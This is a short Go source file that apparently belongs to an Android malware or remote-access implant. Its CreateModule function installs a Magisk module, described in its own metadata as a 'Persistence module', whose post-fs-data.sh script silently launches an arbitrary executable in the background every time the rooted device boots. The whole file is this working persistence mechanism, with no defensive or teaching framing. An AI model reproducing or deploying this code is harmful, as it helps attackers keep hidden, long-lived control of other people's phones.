package android

import (
"os"
)

type MagiskModule struct{}

func NewMagiskModule() *MagiskModule {
return &MagiskModule{}
}

func (m *MagiskModule) CreateModule(name, execPath string) error {
moduleDir := "/data/adb/modules/" + name
if err := os.MkdirAll(moduleDir, 0755); err != nil {
return err
}
moduleProp := `id=` + name + `
name=Angel Module
version=1.0
versionCode=1
author=Angel
description=Persistence module`
if err := os.WriteFile(moduleDir+"/module.prop", []byte(moduleProp), 0644); err != nil {
return err
}
return os.WriteFile(moduleDir+"/post-fs-data.sh", []byte("#!/system/bin/sh\n"+execPath+" &\n"), 0755)
}
